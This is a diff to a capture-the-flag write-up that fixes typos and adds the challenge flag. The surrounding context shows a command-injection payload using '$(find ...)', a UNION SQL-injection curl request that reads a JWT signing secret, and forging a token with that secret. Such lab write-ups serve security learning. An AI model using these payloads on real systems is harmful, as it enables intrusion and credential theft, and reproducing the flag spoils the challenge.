@@ -35,7 +35,7 @@ def format_date(timestr):
 ```
 
 - that is an obvious command injection
-- search other files and i don't see any sanitization so i can input something like this
+- i search other files and i don't see any sanitization so i can input something like this
 
 ```
 $(find / -name flag.txt 2>/dev/null)
@@ -77,7 +77,7 @@ INSERT INTO tannen_memorial.keystore VALUES (1,'${DEVKEY}');
 INSERT INTO tannen_memorial.keystore VALUES (2,'${PRODKEY}');
 ```
 
-- this create a database called `tannen_memorial` and in that database it creates a table called `keystore`, in there it has `kid` and `secret`.
+- this creates a database called `tannen_memorial` and in that database it creates a table called `keystore`, in there it has `kid` and `secret`.
 - from there it inserts completely random values into the keystore secrets
 - the next thing we need to understand is the jwt implementation, that exists in the `JSTHelpers.js` file:
 
@@ -114,7 +114,7 @@ sign(data, kid='2') {
     }
 ```
 - this function has a clear and obvious sqli in the `/posts/:id` endpoint
-- i'll try a union sqli and attempto read the secret, i already know the table and column nanme so all i'll need to do is find the column # count.
+- i'll try a union sqli and attempt to read the secret, i already know the table and column name so all i'll need to do is find the column # count.
 
 - start by curling the `/posts/1` endpoint
 
@@ -160,7 +160,7 @@ $ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%
                   <p class="card-text">4</p>
 ```
 
-- bingo! i got a secret, this must be the dev secret aka kid 1 i can try and see if that works by editing it in jwt.io
+- bingo! i got a secret, this must be the dev secret aka kid 1 since that is the secret that i read. i can try and see if that works by editing it in jwt.io
 
 ![](assets/images/htb-ctf-usf-maddog-jwt.png)
 
@@ -169,5 +169,6 @@ $ curl http://161.35.173.232:31576/posts/\'union%20select%201,secret,3,4%20from%
 
 ![](assets/images/htb-ctf-usf-maddog-flag.png)
 
+- flag: `HTB{t4nn3n_fr4m3d_th3_mcFly}`
 
 ### 
